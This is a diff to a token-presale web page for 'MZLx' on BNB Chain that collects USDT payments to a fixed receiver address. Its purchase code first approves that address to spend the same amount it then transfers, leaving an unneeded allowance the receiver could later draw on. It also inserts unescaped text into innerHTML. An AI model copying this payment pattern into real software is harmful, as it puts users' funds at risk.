@@ -12,13 +12,13 @@
     }
     
     body {
-      font-family: Arial, sans-serif;
-      background: #008080;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #006666, #008080);
       display: flex;
       justify-content: center;
-      align-items: flex-start;
+      align-items: center;
       min-height: 100vh;
-      padding: 20px 10px;
+      padding: 20px;
       overflow-y: auto;
       touch-action: pan-y;
       -webkit-tap-highlight-color: transparent;
@@ -26,134 +26,156 @@
     
     .container {
       width: 100%;
-      max-width: 420px;
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-      padding: 25px;
+      max-width: 450px;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+      padding: 30px;
       text-align: center;
       position: relative;
       margin: 20px 0;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
     }
     
     .logo {
-      width: 100px;
-      height: 100px;
-      margin: 0 auto 15px auto;
+      width: 110px;
+      height: 110px;
+      margin: 0 auto 20px auto;
       display: block;
       border-radius: 50%;
       object-fit: cover;
+      border: 3px solid #1a73e8;
+      box-shadow: 0 4px 10px rgba(26, 115, 232, 0.2);
     }
     
     h1 {
-      font-size: 1.3em;
-      margin-bottom: 8px;
+      font-size: 1.4rem;
+      margin-bottom: 10px;
       color: #222;
       line-height: 1.3;
+      font-weight: 700;
     }
     
     .subtitle {
       color: #1a73e8;
-      font-size: 0.95em;
-      margin-bottom: 20px;
+      font-size: 1rem;
+      margin-bottom: 25px;
       line-height: 1.4;
+      font-weight: 600;
     }
     
     .desc {
       color: #555;
-      margin-bottom: 20px;
-      font-size: 0.95em;
+      margin-bottom: 25px;
+      font-size: 0.95rem;
       line-height: 1.5;
+      padding: 0 10px;
     }
     
     .input-group {
-      margin-bottom: 15px;
+      margin-bottom: 20px;
       text-align: left;
     }
     
     label {
       display: block;
-      margin-bottom: 6px;
+      margin-bottom: 8px;
       color: #333;
       font-weight: 600;
-      font-size: 0.95em;
+      font-size: 0.95rem;
     }
     
     input[type="number"] {
       width: 100%;
-      padding: 14px;
-      font-size: 1em;
-      border-radius: 8px;
+      padding: 16px;
+      font-size: 1.05rem;
+      border-radius: 10px;
       border: 1px solid #ddd;
       background: #f9f9f9;
       -webkit-appearance: none;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    
+    input[type="number"]:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
+      outline: none;
     }
     
     .output {
-      margin-bottom: 15px;
-      padding: 12px;
+      margin-bottom: 20px;
+      padding: 15px;
       background: #f0f9ff;
-      border-radius: 8px;
+      border-radius: 10px;
       font-weight: bold;
-      font-size: 1.05em;
+      font-size: 1.1rem;
       color: #1a73e8;
+      border: 1px solid #cce5ff;
     }
     
     button {
       width: 100%;
-      padding: 16px;
-      background: #1a73e8;
+      padding: 17px;
+      background: linear-gradient(to right, #1a73e8, #0d5abf);
       color: #fff;
       border: none;
-      border-radius: 8px;
-      font-size: 1.1em;
+      border-radius: 10px;
+      font-size: 1.1rem;
       font-weight: 600;
       cursor: pointer;
-      margin-bottom: 12px;
-      transition: background 0.2s;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      margin-bottom: 15px;
+      transition: all 0.3s;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+      position: relative;
+      overflow: hidden;
     }
     
     button:active {
-      transform: translateY(1px);
+      transform: translateY(2px);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
     }
     
     button:hover:not(:disabled) {
-      background: #0d5abf;
+      background: linear-gradient(to right, #0d5abf, #0a4a9e);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
     }
     
     button:disabled {
       background: #aaa;
       cursor: not-allowed;
       opacity: 0.7;
+      transform: none;
+      box-shadow: none;
     }
     
     .wallet-options {
       display: none;
       position: absolute;
       bottom: 100%;
-      left: 25px;
-      right: 25px;
+      left: 30px;
+      right: 30px;
       background: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      padding: 10px;
-      margin-bottom: 10px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+      padding: 15px;
+      margin-bottom: 15px;
       z-index: 100;
-      max-height: 200px;
+      max-height: 220px;
       overflow-y: auto;
     }
     
     .wallet-option {
       display: flex;
       align-items: center;
-      justify-content: center;
-      padding: 14px;
-      margin-bottom: 10px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
+      justify-content: flex-start;
+      padding: 15px;
+      margin-bottom: 12px;
+      border: 1px solid #e0e0e0;
+      border-radius: 10px;
       cursor: pointer;
-      transition: background 0.2s;
+      transition: all 0.3s;
       background: #f8f9fa;
     }
     
@@ -163,31 +185,34 @@
     
     .wallet-option:hover {
       background: #eef5ff;
+      border-color: #1a73e8;
+      box-shadow: 0 4px 8px rgba(26, 115, 232, 0.15);
     }
     
     .wallet-icon {
-      width: 24px;
-      height: 24px;
-      margin-right: 10px;
+      width: 28px;
+      height: 28px;
+      margin-right: 12px;
       object-fit: contain;
     }
     
     .footer {
       text-align: center;
       color: #999;
-      font-size: 0.85em;
-      margin-top: 20px;
+      font-size: 0.85rem;
+      margin-top: 25px;
       padding-top: 15px;
       border-top: 1px solid #eee;
     }
     
     .status {
-      margin-top: 15px;
-      padding: 14px;
-      border-radius: 8px;
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
       display: none;
-      font-size: 0.95em;
-      line-height: 1.4;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      text-align: left;
     }
     
     .status.success {
@@ -209,13 +234,22 @@
     }
     
     .connected-wallet {
-      font-size: 0.9em;
-      margin: 10px 0 15px;
+      font-size: 0.9rem;
+      margin: 15px 0 20px;
       color: #28a745;
       font-weight: 600;
-      padding: 8px;
+      padding: 10px;
       background: #e8f5e9;
-      border-radius: 6px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .wallet-icon-small {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
     }
     
     .overlay {
@@ -225,33 +259,137 @@
       left: 0;
       right: 0;
       bottom: 0;
-      background: rgba(0,0,0,0.5);
+      background: rgba(0, 0, 0, 0.6);
       z-index: 99;
+    }
+    
+    .transaction-modal {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      border-radius: 16px;
+      padding: 25px;
+      z-index: 101;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+    }
+    
+    .modal-content {
+      text-align: center;
+    }
+    
+    .modal-title {
+      font-size: 1.3rem;
+      margin-bottom: 15px;
+      color: #1a73e8;
+      font-weight: 700;
+    }
+    
+    .modal-details {
+      margin-bottom: 20px;
+      text-align: left;
+      background: #f9f9f9;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #eee;
+    }
+    
+    .modal-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    
+    .modal-label {
+      font-weight: 600;
+      color: #555;
+    }
+    
+    .modal-value {
+      font-weight: 600;
+      color: #222;
+    }
+    
+    .modal-actions {
+      display: flex;
+      gap: 15px;
+    }
+    
+    .modal-btn {
+      flex: 1;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    
+    .modal-confirm {
+      background: linear-gradient(to right, #1a73e8, #0d5abf);
+      color: white;
+      border: none;
+    }
+    
+    .modal-cancel {
+      background: #f0f0f0;
+      color: #555;
+      border: 1px solid #ddd;
+    }
+    
+    .modal-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(26, 115, 232, 0.3);
+      border-radius: 50%;
+      border-top-color: #1a73e8;
+      animation: spin 1s linear infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
     
     @media (max-width: 480px) {
       .container {
-        padding: 20px 15px;
-        border-radius: 10px;
+        padding: 25px 20px;
+        border-radius: 14px;
       }
       
       h1 {
-        font-size: 1.2em;
+        font-size: 1.25rem;
       }
       
       .logo {
-        width: 90px;
-        height: 90px;
+        width: 95px;
+        height: 95px;
       }
       
       button {
-        padding: 14px;
-        font-size: 1em;
+        padding: 16px;
+        font-size: 1.05rem;
       }
       
       .wallet-options {
-        left: 15px;
-        right: 15px;
+        left: 20px;
+        right: 20px;
+        padding: 12px;
+      }
+      
+      .transaction-modal {
+        padding: 20px;
       }
     }
     
@@ -261,10 +399,15 @@
         top: 50%;
         left: 50%;
         transform: translate(-50%, -50%);
-        width: calc(100% - 30px);
-        max-width: 350px;
+        width: calc(100% - 40px);
+        max-width: 360px;
         max-height: 70vh;
         bottom: auto;
+      }
+      
+      body {
+        align-items: flex-start;
+        padding-top: 30px;
       }
     }
   </style>
@@ -273,6 +416,30 @@
 </head>
 <body>
   <div class="overlay" id="overlay"></div>
+  
+  <div class="transaction-modal" id="transactionModal">
+    <div class="modal-content">
+      <h3 class="modal-title">Confirm Transaction</h3>
+      <div class="modal-details">
+        <div class="modal-row">
+          <span class="modal-label">You Pay:</span>
+          <span class="modal-value" id="modalUsdt">0 USDT</span>
+        </div>
+        <div class="modal-row">
+          <span class="modal-label">You Receive:</span>
+          <span class="modal-value" id="modalMzlx">0 MZLx</span>
+        </div>
+        <div class="modal-row">
+          <span class="modal-label">Network Fee:</span>
+          <span class="modal-value">~$0.50 - $1.50</span>
+        </div>
+      </div>
+      <div class="modal-actions">
+        <button class="modal-btn modal-cancel" id="modalCancel">Cancel</button>
+        <button class="modal-btn modal-confirm" id="modalConfirm">Confirm</button>
+      </div>
+    </div>
+  </div>
   
   <div class="container">
     <img class="logo" src="https://i.imgur.com/gaCl9Zz.jpeg" alt="MAZOL Logo" />
@@ -288,7 +455,10 @@
     <div class="output" id="mzlxOutput">You will receive: 0 MZLx</div>
     
     <button id="connectBtn">Connect Wallet</button>
-    <div id="walletInfo" class="connected-wallet" style="display: none;"></div>
+    <div id="walletInfo" class="connected-wallet" style="display: none;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon-small" alt="Wallet">
+      <span id="walletAddress">0x...0000</span>
+    </div>
     
     <div class="wallet-options" id="walletOptions">
       <div class="wallet-option" id="metamaskOption">
@@ -314,7 +484,7 @@
     const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
     const RECEIVER_ADDRESS = "0x4bd6033bCe207fa4F5a2Bd4d003a690ed4c3D859";
     const BNB_CHAIN_ID = 56;
-    const API_BASE_URL = "https://mazol.onrender.com"; // UPDATE WITH YOUR BACKEND URL
+    const API_BASE_URL = "https://mazol.onrender.com";
 
     // ===== UI ELEMENTS ===== //
     const usdtInput = document.getElementById("usdtAmount");
@@ -326,7 +496,14 @@
     const metamaskOption = document.getElementById("metamaskOption");
     const walletConnectOption = document.getElementById("walletConnectOption");
     const walletInfo = document.getElementById("walletInfo");
+    const walletAddress = document.getElementById("walletAddress");
     const overlay = document.getElementById("overlay");
+    const transactionModal = document.getElementById("transactionModal");
+    const modalUsdt = document.getElementById("modalUsdt");
+    const modalMzlx = document.getElementById("modalMzlx");
+    const modalCancel = document.getElementById("modalCancel");
+    const modalConfirm = document.getElementById("modalConfirm");
+    const modalContent = document.querySelector(".modal-content");
 
     // ===== STATE VARIABLES ===== //
     let provider = null;
@@ -336,6 +513,9 @@
     let mzlxDecimals = 18;
     let walletConnectProvider = null;
     let currentUSDTAmount = 0;
+    let currentMZLxAmount = 0;
+    let usdtContract = null;
+    let currentTransaction = null;
 
     // ===== INITIAL SETUP ===== //
     document.addEventListener('DOMContentLoaded', initApp);
@@ -346,12 +526,14 @@
       connectBtn.addEventListener('click', toggleWalletOptions);
       metamaskOption.addEventListener('click', connectMetaMask);
       walletConnectOption.addEventListener('click', connectWalletConnect);
-      buyBtn.addEventListener('click', startPurchaseProcess);
+      buyBtn.addEventListener('click', showTransactionConfirmation);
       overlay.addEventListener('click', closeWalletOptions);
+      modalCancel.addEventListener('click', closeTransactionModal);
+      modalConfirm.addEventListener('click', startPurchaseProcess);
       
       // Auto-connect if returning user
       if (window.ethereum && window.ethereum.selectedAddress) {
-        connectMetaMask();
+        setTimeout(() => connectMetaMask(), 500);
       }
       
       // Initialize calculation
@@ -376,22 +558,39 @@
           walletOptions.style.top = '50%';
           walletOptions.style.left = '50%';
           walletOptions.style.transform = 'translate(-50%, -50%)';
-          walletOptions.style.width = 'calc(100% - 30px)';
-          walletOptions.style.maxWidth = '350px';
+          walletOptions.style.width = 'calc(100% - 40px)';
+          walletOptions.style.maxWidth = '360px';
         }
       }
+    }
+    
+    function showTransactionConfirmation() {
+      if (!userAddress || currentUSDTAmount < TOKEN_PRICE) {
+        showStatus("Please connect wallet and enter valid USDT amount", "error");
+        return;
+      }
+      
+      modalUsdt.textContent = `${currentUSDTAmount.toFixed(2)} USDT`;
+      modalMzlx.textContent = `${currentMZLxAmount.toFixed(2)} MZLx`;
+      
+      transactionModal.style.display = 'block';
+      overlay.style.display = 'block';
+    }
+    
+    function closeTransactionModal() {
+      transactionModal.style.display = 'none';
+      overlay.style.display = 'none';
     }
 
     // ===== REAL-TIME CALCULATION ===== //
     function handleUSDTInput() {
       currentUSDTAmount = parseFloat(usdtInput.value) || 0;
+      currentMZLxAmount = currentUSDTAmount > 0 ? currentUSDTAmount / TOKEN_PRICE : 0;
       updateMZLxOutput();
     }
 
     function updateMZLxOutput() {
-      const mzlxAmount = currentUSDTAmount > 0 ? currentUSDTAmount / TOKEN_PRICE : 0;
-      
-      mzlxOutput.textContent = `You will receive: ${mzlxAmount.toLocaleString(undefined, {
+      mzlxOutput.textContent = `You will receive: ${currentMZLxAmount.toLocaleString(undefined, {
         minimumFractionDigits: 2,
         maximumFractionDigits: 2
       })} MZLx`;
@@ -406,6 +605,7 @@
       
       if (!window.ethereum) {
         showStatus("MetaMask not detected. Please install MetaMask first.", "error");
+        window.open("https://metamask.io/download.html", "_blank");
         return;
       }
       
@@ -450,13 +650,14 @@
         // Update UI
         connectBtn.textContent = "Connected";
         connectBtn.disabled = true;
-        walletInfo.textContent = `Connected: ${shortenAddress(userAddress)}`;
-        walletInfo.style.display = "block";
+        walletAddress.textContent = shortenAddress(userAddress);
+        walletInfo.style.display = "flex";
+        
+        // Get token contracts
+        usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         
         // Get token decimals
-        const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         usdtDecimals = await usdtContract.decimals();
-        
         const mzlxContract = new ethers.Contract(MZLX_ADDRESS, ERC20_ABI, provider);
         mzlxDecimals = await mzlxContract.decimals();
         
@@ -491,18 +692,12 @@
 
     // ===== PURCHASE WORKFLOW ===== //
     async function startPurchaseProcess() {
-      if (!userAddress || currentUSDTAmount < TOKEN_PRICE) {
-        showStatus("Please connect wallet and enter valid USDT amount", "error");
-        return;
-      }
+      closeTransactionModal();
       
       try {
-        // Calculate values
-        const mzlxAmount = currentUSDTAmount / TOKEN_PRICE;
         const usdtValue = ethers.parseUnits(currentUSDTAmount.toString(), usdtDecimals);
         
         // Step 1: Check balance
-        const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
         const usdtBalance = await usdtContract.balanceOf(userAddress);
         
         if (usdtBalance < usdtValue) {
@@ -519,9 +714,9 @@
           showStatus("Approving USDT spending... Please confirm in wallet", "processing");
           
           // Force wallet to open by adding delay
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          await new Promise(resolve => setTimeout(resolve, 500));
           
-          const approveTx = await usdtContract.approve(RECEIVER_ADDRESS, usdtValue);
+          const approveTx = await usdtContract.connect(signer).approve(RECEIVER_ADDRESS, usdtValue);
           await approveTx.wait();
           
           showStatus("USDT spending approved!", "success");
@@ -532,16 +727,21 @@
         showStatus("Sending USDT... Please confirm transaction", "processing");
         
         // Force wallet to open by adding delay
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(resolve => setTimeout(resolve, 500));
         
-        const usdtTx = await usdtContract.transfer(RECEIVER_ADDRESS, usdtValue);
+        const usdtTx = await usdtContract.connect(signer).transfer(RECEIVER_ADDRESS, usdtValue);
+        currentTransaction = usdtTx.hash;
+        
+        // Show initial confirmation
+        showStatus("Transaction submitted. Waiting for confirmation...", "processing");
+        
         const receipt = await usdtTx.wait();
         
         if (receipt.status !== 1) {
           throw new Error("USDT transfer failed");
         }
         
-        showStatus(`USDT ${currentUSDTAmount} sent successfully!`, "success");
+        showStatus(`${currentUSDTAmount} USDT sent successfully!`, "success");
         
         // Step 4: Send to backend for token distribution
         buyBtn.textContent = "Processing Tokens...";
@@ -550,17 +750,28 @@
         await sendToBackend({
           walletAddress: userAddress,
           usdtAmount: currentUSDTAmount,
-          mzlxAmount: mzlxAmount,
+          mzlxAmount: currentMZLxAmount,
           txHash: usdtTx.hash
         });
         
-        showStatus(`Success! ${mzlxAmount.toFixed(2)} MZLx will arrive shortly`, "success");
+        showStatus(`Success! ${currentMZLxAmount.toFixed(2)} MZLx will arrive shortly`, "success");
+        
+        // Reset form
+        usdtInput.value = "";
+        currentUSDTAmount = 0;
+        currentMZLxAmount = 0;
+        updateMZLxOutput();
         
       } catch (err) {
-        showStatus("Transaction failed: " + (err.reason || err.message || err), "error");
+        const errorMsg = err.reason || err.message || err;
+        showStatus("Transaction failed: " + errorMsg, "error");
+        if (currentTransaction) {
+          statusMessage.innerHTML += `<div style="font-size:0.8rem; margin-top:8px;">TX: ${shortenAddress(currentTransaction)}</div>`;
+        }
       } finally {
         buyBtn.textContent = "Buy MZLx";
         buyBtn.disabled = !userAddress || currentUSDTAmount < TOKEN_PRICE;
+        currentTransaction = null;
       }
     }
 
@@ -568,10 +779,12 @@
     async function sendToBackend(data) {
       if (!API_BASE_URL) {
         console.log("Backend not configured. Skipping backend call.");
-        return;
+        return { success: true, simulated: true };
       }
       
       try {
+        showStatus("Finalizing transaction with backend...", "processing");
+        
         const response = await fetch(`${API_BASE_URL}/api/purchase`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -579,7 +792,8 @@
         });
         
         if (!response.ok) {
-          throw new Error('Backend request failed');
+          const errorData = await response.json();
+          throw new Error(errorData.error || 'Backend request failed');
         }
         
         const result = await response.json();
@@ -595,10 +809,15 @@
       statusMessage.className = 'status ' + type;
       statusMessage.style.display = 'block';
       
+      // Add spinner for processing messages
+      if (type === 'processing') {
+        statusMessage.innerHTML = `<span class="spinner"></span> ${message}`;
+      }
+      
       // Auto-hide success messages after 15 seconds
       if (type === 'success') {
         setTimeout(() => {
-          if (statusMessage.textContent === message) {
+          if (statusMessage.textContent === message || statusMessage.innerHTML.includes(message)) {
             statusMessage.style.display = 'none';
           }
         }, 15000);
@@ -606,7 +825,8 @@
     }
 
     function shortenAddress(address) {
-      return address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : '';
+      if (!address) return "";
+      return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
     }
 
     // ERC20 ABI (minimal)
